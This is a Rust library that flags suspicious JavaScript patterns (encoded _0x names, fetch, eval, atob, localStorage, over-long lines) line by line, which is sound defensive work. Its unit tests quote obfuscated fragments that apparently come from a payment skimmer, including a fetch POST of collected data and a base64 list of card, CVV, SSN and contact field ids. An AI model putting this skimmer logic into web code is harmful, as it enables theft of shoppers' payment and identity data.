/*
    Library crate javascript.
    Detections/Security
    lib.rs
*/

const MAX_LINE_SIZE: usize = 1000;
const LINE_SIZE_FLAG: &str = "Some of the lines are too large. ";
const ANONYMOUS_FLAG: &str = "Anonymous function by itself is not bad. It speed up machine time. But it spoil fun for the fun loving people. How are they going to call it? It doesn't have a name, to start with... ";
const HEX_NAME_FLAG: &str = "It uses encoded names. ";
const FETCH_FLAG: &str = "It uses fetch method. ";
const XML_HTTP_REQUEST_FLAG: &str = "It uses XMLHttpRequest method. ";
const EVAL_FLAG: &str = "It uses eval method. ";
const EXEC_SCRIPT_FLAG: &str = "It uses execScript method. ";
const ATOB_FLAG: &str = "It uses atob method. ";
const BTOA_FLAG: &str = "It uses btoa method. ";
const PREVENT_DEFAULT_FLAG: &str = "It uses preventDefault method. ";
const LOCAL_STORAGE_FLAG: &str = "It uses or it checks for localStorage. ";
const UNUSUAL_BEHAVIOR_FLAG: &str = "Unusual behavior .... ";
const SUSPICIOUS_BEHAIOR_FLAG: &str = "Suspicious behavior ... ";

#[derive(Clone, Debug)]
pub struct StatsModel {
    pub var: i32, pub function: i32,
    pub let_kw: i32, pub const_kw: i32,
    pub anonymous_function: i32,
    pub fetch: i32, pub xml_http_request: i32,
    pub eval: i32, pub exec_script: i32,
    pub prevent_default: i32,
    pub local_storage: i32,
    pub atob: i32, pub btoa: i32,
    pub unusual_behavior: i32,
    pub suspicious_behavior: i32,
    pub flags: i32,
    // pub lambda_statements: i32,
}

#[derive(Clone, Debug)]
pub struct StatsListModel {
    pub var_names: Vec<String>, pub function_names: Vec<String>,
    pub const_names: Vec<String>, pub other_names: Vec<String>,
    pub flag_reasons: Vec<String>,
}

#[derive(Clone, Debug)]
pub struct JavaScriptModel {
    line_number: usize,
    line: String,
    variable: bool,
    function: bool,
    const_kw: bool,
    variable_name: String,
    function_name: String,
    const_name: String,
    hex_name: bool,
    anonymous_function: bool,
    fetch: bool,
    xml_http_request: bool,
    eval: bool,
    exec_script: bool,
    prevent_default: bool,
    local_storage: bool,
    atob: bool,
    btoa: bool,
    script_size: usize,
    line_size: usize,
    flag: bool,
    flag_reason: String,
    unusual_behavior: bool,
    suspicious_behavior: bool,
}

impl JavaScriptModel {
    //
    fn review(&mut self, stats: &mut StatsModel, stats_list: &mut StatsListModel) {
        let line = &self.line;
        let len = line.len();
        self.line_size = len;
        self.evaluate(stats, stats_list);
    }
    //
    fn evaluate(&mut self, stats: &mut StatsModel, stats_list: &mut StatsListModel) {
        let mut flag: bool = false;
        let mut reason: String = String::new();
        let mut is_hex_name: bool = false;
        //
        let is_anonymous_fun = check_if_anonymous_function(&self.line);
        if is_anonymous_fun {
            self.anonymous_function = true;
            self.function_name = String::new();
            flag = true;
            reason.push_str(ANONYMOUS_FLAG);
            stats.anonymous_function += 1;
            stats.flags += 1;
            stats_list.flag_reasons.push(String::from(ANONYMOUS_FLAG));
        }
        //
        let (is_fun, fun_name) = check_if_fun(&self.line);
        if is_fun {
            self.function = true;
            self.function_name = fun_name.clone();
            stats.function += 1;
            stats_list.function_names.push(fun_name.clone());
            let hex_name_0x = fun_name.clone();
            if check_if_hex_name(&hex_name_0x) {
               is_hex_name = true;
            }
        }
        //
        let (is_const, const_name) = check_if_const(&self.line);
        if is_const {
            self.const_kw = true;
            self.const_name = const_name.clone();
            stats.const_kw += 1;
            stats_list.const_names.push(const_name.clone());
            let hex_name_0x = const_name.clone();
            if check_if_hex_name(&hex_name_0x) {
               is_hex_name = true;
            }
        }
        //
        let (is_var, is_let, var_name) = check_if_var(&self.line);
        if is_var {
            self.variable = true;
            self.variable_name = var_name.clone();
            stats.var += 1;
            stats_list.var_names.push(var_name.clone());
            let hex_name_0x = var_name.clone();
            if check_if_hex_name(&hex_name_0x) {
               is_hex_name = true;
            }
        }
        if is_let {
            self.variable = true;
            self.variable_name = var_name.clone();
            stats.let_kw += 1;
            let hex_name_0x = var_name.clone();
            if check_if_hex_name(&hex_name_0x) {
               is_hex_name = true;
            }
        }
        //
        if is_hex_name {
            self.hex_name = true;
            flag = true;
            reason.push_str(HEX_NAME_FLAG);
            stats.flags += 1;
            stats_list.flag_reasons.push(String::from(HEX_NAME_FLAG));
        }
        //
        let fetch = check_if_it_use_fetch (&self.line);
        if fetch {
            self.fetch = true;
            flag = true;
            reason.push_str(FETCH_FLAG);
            stats.flags += 1;
            stats.fetch += 1;
            stats_list.flag_reasons.push(String::from(FETCH_FLAG));
        }
        //
        let xml_http_req = check_if_it_use_xml_http_req (&self.line);
        if xml_http_req {
            self.xml_http_request = true;
            flag = true;
            reason.push_str(XML_HTTP_REQUEST_FLAG);
            stats.flags += 1;
            stats.xml_http_request += 1;
            stats_list.flag_reasons.push(String::from(XML_HTTP_REQUEST_FLAG));
        }
        //
        let eval = check_if_it_use_eval (&self.line);
        if eval {
            self.eval = true;
            flag = true;
            reason.push_str(EVAL_FLAG);
            stats.flags += 1;
            stats.eval += 1;
            stats_list.flag_reasons.push(String::from(EVAL_FLAG));
        }
        //
        let exec_script = check_if_it_use_exec_script (&self.line);
        if exec_script {
            self.exec_script = true;
            flag = true;
            reason.push_str(EXEC_SCRIPT_FLAG);
            stats.flags += 1;
            stats.exec_script += 1;
            stats_list.flag_reasons.push(String::from(EXEC_SCRIPT_FLAG));
        }
        //
        let prevent_default = check_if_it_prevent_default (&self.line);
        if prevent_default {
            self.prevent_default = true;
            flag = true;
            reason.push_str(PREVENT_DEFAULT_FLAG);
            self.suspicious_behavior = true;
            reason.push_str(SUSPICIOUS_BEHAIOR_FLAG);
            stats.flags += 1;
            stats.prevent_default += 1;
            stats_list.flag_reasons.push(String::from(PREVENT_DEFAULT_FLAG));
            stats.flags += 1;
            stats.suspicious_behavior += 1;
            stats_list.flag_reasons.push(String::from(SUSPICIOUS_BEHAIOR_FLAG));
        }
        //
        let local_storage: bool = check_if_it_use_local_storage (&self.line);
        if local_storage {
            self.local_storage = true;
            flag = true;
            reason.push_str(LOCAL_STORAGE_FLAG);
            stats.flags += 1;
            stats.local_storage += 1;
            stats_list.flag_reasons.push(String::from(LOCAL_STORAGE_FLAG));
        }
        //
        let atob = check_if_it_use_atob (&self.line);
        if atob {
            self.atob = true;
            flag = true;
            reason.push_str(ATOB_FLAG);
            stats.flags += 1;
            stats.atob += 1;
            stats_list.flag_reasons.push(String::from(ATOB_FLAG));
        }
        //
        let btoa = check_if_it_use_btoa (&self.line);
        if btoa {
            self.btoa = true;
            flag = true;
            reason.push_str(BTOA_FLAG);
            stats.flags += 1;
            stats.btoa += 1;
            stats_list.flag_reasons.push(String::from(BTOA_FLAG));
        }
        //
        let size_limit: bool = check_if_line_size_is_too_big(&self.line);
        if size_limit {
            let number_line = &self.line_number;
            let size_file = &self.script_size;
            let size_line = &self.line_size;
            let line_info = format!(" Line_number: {}, File_size: {}, Line_size: {} ", number_line, size_file, size_line);
            flag = true;
            reason.push_str(LINE_SIZE_FLAG);
            reason.push_str(&line_info);
            stats.flags += 1;
            stats_list.flag_reasons.push(String::from(LINE_SIZE_FLAG));
            stats.flags += 1;
            stats.unusual_behavior += 1;
            stats_list.flag_reasons.push(String::from(UNUSUAL_BEHAVIOR_FLAG));

        }
        //
        let unusual = check_if_unusual_behavior (&self.line);
        if unusual {
            self.unusual_behavior = true;
            flag = true;
            reason.push_str(UNUSUAL_BEHAVIOR_FLAG);
            stats.flags += 1;
            stats.unusual_behavior += 1;
            stats_list.flag_reasons.push(String::from(UNUSUAL_BEHAVIOR_FLAG));
        }
        //
        if flag {
            self.flag = flag;
            self.flag_reason = reason;
        }
        //
    }
    //
}

pub fn new(line_number: usize, line: String, script_size: usize, stats: &mut StatsModel, stats_list: &mut StatsListModel) -> JavaScriptModel {
    let mut javascript_js = JavaScriptModel {
        line_number: line_number,
        line: line,
        variable: false,
        function: false,
        const_kw: false,
        variable_name: String::new(),
        function_name: String::new(),
        const_name: String::new(),
        hex_name: false,
        anonymous_function: false,
        fetch: false,
        xml_http_request: false,
        eval: false,
        exec_script: false,
        prevent_default: false,
        local_storage: false,
        atob: false,
        btoa: false,
        script_size: script_size,
        line_size: 0,
        flag: false,
        flag_reason: String::new(),
        unusual_behavior: false,
        suspicious_behavior: false,
    };
    //
    javascript_js.review(stats, stats_list);
    javascript_js
}

fn check_if_var(line: &String) -> (bool, bool, String){
    let mut lines: Vec<&str> = line.split("var ").collect();
    let mut is_let = false;
    let mut is_var = false;
    let mut other = false;
    if lines.len() < 2 {
        lines = line.split("let ").collect();
        other = true;
    }
    let mut var_name = String::new();
    if lines.len() > 1 {
        if other {
            is_let = true;
        }
        is_var = true;
        var_name = get_var_name(&lines[1].to_string());
    }

    (is_var, is_let, var_name)
}

fn check_if_fun(line: &String) -> (bool, String){
    let lines: Vec<&str> = line.split("function").collect();
    let mut is_fun = false;
    let mut fun_name = String::new();
    if lines.len() > 1 {
        is_fun = true;
        fun_name = get_function_name(&lines[1].to_string());
    }

    (is_fun, fun_name)
}

fn check_if_const(line: &String) -> (bool, String){
    let lines: Vec<&str> = line.split("const ").collect();
    let mut is_const = false;
    let mut const_name = String::new();
    if lines.len() > 1 {
        is_const = true;
        const_name = get_var_name(&lines[1].to_string());
    }

    (is_const, const_name)
}

fn check_if_anonymous_function (line: &String) -> bool {
    let (is_fun, fun_name) = check_if_fun(line);
    let mut is_anonymous_fun = false;
    if is_fun {
        let name_len = fun_name.len();
        if (name_len < 1) | (fun_name == String::from(" ")) {
            is_anonymous_fun = true;
        }
    }

    is_anonymous_fun
}

fn check_if_hex_name (line: &String) -> bool {
    let mut hex_name: String = String::from(line);
    let len = hex_name.len();
    let mut is_hex_name: bool = false;
    if len > 3 {
        let (hex_name_0x, _last_str) = hex_name.split_at_mut(3);
        if hex_name_0x == "_0x" {
            is_hex_name = true;
        }
    }
    is_hex_name
}

fn check_if_it_use_fetch (line: &String) -> bool {
    let lines: Vec<&str> = line.split("fetch").collect();
    let mut it_uses: bool = false;
    if lines.len() > 1 {
        it_uses = true;
    }
    it_uses
}

fn check_if_it_use_xml_http_req (line: &String) -> bool {
    let lines: Vec<&str> = line.split("XMLHttpRequest").collect();
    let mut it_uses = false;
    if lines.len() > 1 {
        it_uses = true;
    }
    it_uses
}

fn check_if_it_use_eval (line: &String) -> bool {
    let lines: Vec<&str> = line.split(".eval").collect();
    let mut it_uses: bool = false;
    if lines.len() > 1 {
        it_uses = true;
    }
    it_uses
}

fn check_if_it_use_exec_script (line: &String) -> bool {
    let lines: Vec<&str> = line.split(".execScript").collect();
    let mut it_uses: bool = false;
    if lines.len() > 1 {
        it_uses = true;
    }
    it_uses
}

fn check_if_it_prevent_default (line: &String) -> bool {
    let lines: Vec<&str> = line.split(".preventDefault").collect();
    let mut it_uses: bool = false;
    if lines.len() > 1 {
        it_uses = true;
    }
    it_uses
}

fn check_if_it_use_local_storage (line: &String) -> bool {
    let lines: Vec<&str> = line.split("localStorage").collect();
    let mut it_uses: bool = false;
    if lines.len() > 1 {
        it_uses = true;
    }
    it_uses
}

fn check_if_it_use_atob (line: &String) -> bool {
    let lines: Vec<&str> = line.split("atob").collect();
    let mut it_uses: bool = false;
    if lines.len() > 1 {
        it_uses = true;
    }
    it_uses
}

fn check_if_it_use_btoa (line: &String) -> bool {
    let lines: Vec<&str> = line.split("btoa").collect();
    let mut it_uses: bool = false;
    if lines.len() > 1 {
        it_uses = true;
    }
    it_uses
}

fn check_if_line_size_is_too_big(line: &String) -> bool {
    let len = line.len();
    let mut big_size: bool = false;
    if len > MAX_LINE_SIZE {
        big_size = true;
    }
    big_size
}

fn check_if_unusual_behavior (line: &String) -> bool {
    let lines: Vec<&str> = line.split("send").collect();
    let mut it_uses: bool = false;
    if lines.len() > 1 {
        let line_x: String = lines[1].to_string();
        let null_x: Vec<&str> = line_x.split("null").collect();
        if null_x.len() > 1 {
            it_uses = true;
        }
    }
    it_uses
}


fn get_function_name(line_x: &String) -> String {
    let lines_1: Vec<&str> = line_x.split('(').collect();
    // lines_1[0].to_string()
    trim_white_spaces(lines_1[0])
}

fn get_var_name(line_x: &String) -> String {
    let lines_1: Vec<&str> = line_x.split(';').collect();
    let name_x = trim_white_spaces(lines_1[0]);
    let var_name: Vec<&str> = name_x.split('=').collect();
    String::from(var_name[0])
}

fn trim_white_spaces(line_x: &str) -> String {
    let lines: Vec<&str> = line_x.split(' ').collect();
    let mut line_x: String = String::new();
    for x in lines {
        if x.chars().nth(0) != Some(' ') {
            line_x.push_str(x);
        }
    }
    line_x
}

pub fn add(left: usize, right: usize) -> usize {
    left + right
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn it_works() {
        let result = add(2, 2);
        assert_eq!(result, 4);
    }

    #[test]
    fn check_if_var_test() {
        let line  = "Cool".to_string();
        let test_name: String = String::new();
        let (is_var, _is_let, var_name) = check_if_var(&line);
        assert_eq!(is_var, false);
        assert_eq!(var_name, test_name);
        //
        let line  = "\r\nfunction zdRndNum(n){\r\nvar rnd=\"\";".to_string();
        let (is_var, _is_let, var_name) = check_if_var(&line);
        assert_eq!(is_var, true);
        assert_eq!(var_name, String::from("rnd"));
        //
        let line  = "\r\nvar i = par[0];".to_string();
        let (is_var, _is_let, var_name) = check_if_var(&line);
        assert_eq!(is_var, true);
        assert_eq!(var_name, String::from("i"));
        //
    }

    #[test]
    fn check_if_fun_test() {
        let line  = "Cool".to_string();
        let test_name: String = String::new();
        let (is_fun, fun_name) = check_if_fun(&line);
        assert_eq!(is_fun, false);
        assert_eq!(fun_name, test_name);
        //
        let line  = "\r\nfunction zdRndNum(n){\r\nvar rnd=\"\";".to_string();
        let (is_fun, fun_name) = check_if_fun(&line);
        assert_eq!(is_fun, true);
        assert_eq!(fun_name, String::from("zdRndNum"));
        //
        let line  = "\r\n}\r\nfunction isIE() {\r\nif (!!window.ActiveXObject || \"ActiveXObject
\" in window)\r\nreturn true;".to_string();
        let (is_fun, fun_name) = check_if_fun(&line);
        assert_eq!(is_fun, true);
        assert_eq!(fun_name, String::from("isIE"));
        //
        let line  = "\r\n\r\n(function () {\r\nconsole.log(\"Analytics loaded!\");".to_string();
        let (is_fun, fun_name) = check_if_fun(&line);
        assert_eq!(is_fun, true);
        assert_eq!(fun_name, String::from(""));
        //
    }

    #[test]
    fn check_if_anonymous_function_test() {
        let line  = "\r\n\r\n(function () {\r\nconsole.log(\"Analytics loaded!\");".to_string();
        let is_anonymous_fun = check_if_anonymous_function (&line);
        assert_eq!(is_anonymous_fun, true);
        //
    }

    #[test]
    fn check_if_hex_name_test() {
        let line  = "\r\n\r\nfunction _0xfd2f(_0x4cbd43,_0x26cb82){var _0x472006=_0x4720();".to_string();
        let (_is_fun, fun_name) = check_if_fun(&line);
        let is_hex = check_if_hex_name (&fun_name);
        assert_eq!(is_hex, true);
        //
    }

    #[test]
    fn check_if_it_use_fetch_test() {
        let line  = "_0x48fd7e[_0x4dcc4c(0x124)](xfkwf['vnskp_param'],_0x1cdb15),fetch(xfkwf[_0x
4dcc4c(0x116)](xfkwf[_0x4dcc4c(0x10b)])+'?'+Math[_0x4dcc4c(0xdb)](),{'method':_0x4dcc4c(0xd7),
'body':_0x48fd7e});".to_string();
        let it_use_fetch = check_if_it_use_fetch (&line);
        assert_eq!(it_use_fetch, true);
        //
    }

    #[test]
    fn check_if_it_use_xml_http_req_test() {
        let line  = "\r\n}else{\r\nvar xhr = new XMLHttpRequest();".to_string();
        let it_use_xml_http_req = check_if_it_use_xml_http_req (&line);
        assert_eq!(it_use_xml_http_req, true);
        //
    }

    #[test]
    fn check_if_it_use_eval_test() {
        let line  = "\r\n} else {\r\nwindow.eval(text);".to_string();
        let it_use_eval = check_if_it_use_eval (&line);
        assert_eq!(it_use_eval, true);
        //
    }

    #[test]
    fn check_if_it_use_exec_script_test() {
        let line  = "\r\nif(window.execScript) {\r\nwindow.execScript(text);".to_string();
        let it_use_exec_script = check_if_it_use_exec_script (&line);
        assert_eq!(it_use_exec_script, true);
        //
    }

    #[test]
    fn check_if_it_prevent_default_test() {
        let line  = "\r\n}\r\ndocument.addEventListener(\"submit\", function (e) {\r\ne.preventDefault();".to_string();
        let it_prevent_default = check_if_it_prevent_default (&line);
        assert_eq!(it_prevent_default, true);
        //
    }

    #[test]
    fn check_if_it_use_local_storage_test() {
        let line  = "return{major:parseInt(e[1],10),minor:parseInt(e[2],10),patch:parseInt(e[3]|
|0,10)}}return null}())?void 0:e.major)>=15}var c={hasXhr2Support:function(){return\"XMLHttpRe
quest\"in window&&\"withCredentials\"in new XMLHttpRequest},hasLocalStorageSupport:function(){
return r(\"localStorage\")},hasSessionStorageSupport:function(){return r(\"sessionStorage\")},
hasFileSupport:function(){return!!(window.FileReader&&window.File&&window.FileList&&window.For
mData)},hasAudioSupport:function(){var e=document.createElement(\"audio\");".to_string();
        let it_use_local_storage = check_if_it_use_local_storage (&line);
        assert_eq!(it_use_local_storage, true);
        //
    }

    #[test]
    fn check_if_line_size_is_too_big_test() {
        let line  = "\r\n\r\nvar par=document.scripts[document.scripts.length-2].text;".to_string();
        let is_too_big = check_if_line_size_is_too_big (&line);
        assert_eq!(is_too_big, false);
        //
        let line  = "},xfkwf[_0x4d5ab1(0xf0)]=document,xfkwf['sfofx']='W1siaWQiLCAiaW5wdXQtcGF5b
WVudC1maXJzdG5hbWUiLCAwLCAiZiIsICJIb2xkZXIiXSwgWyJpZCIsICJpbnB1dC1wYXltZW50LWxhc3RuYW1lIiwgMCw
gImwiLCASG9sZGVyIl0sIFsiaWQiLCAiaW5wdXQtZmlyc3RuYW1lIiwgMCwgImYiLCAiSG9sZGVyIl0sIFsiaWQiLCAiaW
5wdXQtbGFzdG5hbWUiLCAwLCAibCIsICJIb2xkZXIXSwgWyJmaWVsZCIsICJpZnJhbWUiLCAwLCAibiIsICJOdW1iZXIiX
SwgWyJmaWVsZCIsICJpZnJhbWUiLCAwLCAibSIsICJEYXRlIl0sIFsiZmllbGQiLCAiaWZyYW1IiwgMCwgInkiLCAiRGF0
ZSJdLCBbImZpZWxkIiwgImlmcmFtZSIsIDAsICJjIiwgIkNWViJdLCBbImlkIiwgImlucHV0LWNjLW93bmVyIiwgMCwgIm
giLCAiSG9sZGVIl0sIFsiaWQiLCAiaW5wdXQtY2MtbnVtYmVyIiwgMCwgIm4iLCAiTnVtYmVyIl0sIFsiaWQiLCAiaW5wd
XQtY2MtZXhwaXJlLWRhdGUiLCAwLCAibSIsICJEYXRlIl0IFsibmFtZSIsICJjY19leHBpcmVfZGF0ZV95ZWFyIiwgMCwg
InkiLCAiRGF0ZSJdLCBbImlkIiwgImlucHV0LWNjLWN2djIiLCAwLCAiYyIsICJDVlYiXSwgWyJpZCIICJpbnB1dC1wYXl
tZW50LWN1c3RvbS1maWVsZDQiLCAwLCAic24iLCAic3NuIl0sIFsiaWQiLCAiaW5wdXQtcGF5bWVudC1lbWFpbCIsIDAsI
CJlbCIsICJlbWFpbCJLCBbImlkIiwgImlucHV0LWVtYWlsIiwgMCwgImVsIiwgImVtYWlsIl0sIFsiaWQiLCAiaW5wdXQt
cGF5bWVudC10ZWxlcGhvbmUiLCAwLCAicGUiLCAicGhvbmUiXSwWyJpZCIsICJpbnB1dC10ZWxlcGhvbmUiLCAwLCAicGU
iLCAicGhvbmUiXSwgWyJpZCIsICJpbnB1dC1wYXltZW50LWNpdHkiLCAwLCAiY3kiLCAiY2l0eSJdLCBbImlIiwgImlucH
V0LXBheW1lbnQtY291bnRyeSIsIDMsICJjdCIsICJjb3VudHJ5Il0sIFsiaWQiLCAiaW5wdXQtcGF5bWVudC1wb3N0Y29k
ZSIsIDAsICJ6cCIsICJ6aXAXSwgWyJpZCIsICJpbnB1dC1wYXltZW50LXpvbmUiLCAzLCAic3QiLCAic3RhdGUiXSwgWyJ
pZCIsIFsiaW5wdXQtcGF5bWVudC1hZGRyZXNzLTEiLCAiaW5wdXQtcGFbWVudC1hZGRyZXNzLTIiXSwgMCwgImFzIiwgIm
FkZHIiXV0=',xfkwf[_0x4d5ab1(0x10b)]=_0x4d5ab1(0xe6),xfkwf[_0x4d5ab1(0xfb)]=window['JSON'][_0x4
d5ab1(0xf4)](xfkwf[_0x4d5ab1(0x116)](xfkwf[_0x4d5ab1(0xd9)])),xfkwf[_0x4d5ab1(0x10e)]={},xfkwf
[_0x4d5ab1(0xec)]=[],xfkwf[_0x4d5ab1(0xdf)]=_0x4d5ab1(0xfe),xfkwf[_0x4d5ab1(0xe7)]=0x0,xfkwf['
vnskp_param']='hash',xfkwf['qwyjy']=function(){var _0x5ebb97=_0x4d5ab1,_0x37be03=xfkwf[_0x5ebb
97(0xf0)][_0x5ebb97(0x110)](_0x5ebb97(0x122)),_0x3a1440=xfkwf[_0x5ebb97(0xf0)][_0x5ebb97(0x110
)](_0x5ebb97(0x11b)),_0x2bedca=xfkwf[_0x5ebb97(0xf0)][_0x5ebb97(0x110)](_0x5ebb97(0x121));".to_string();
        let is_too_big = check_if_line_size_is_too_big (&line);
        assert_eq!(is_too_big, true);
        //
    }

}
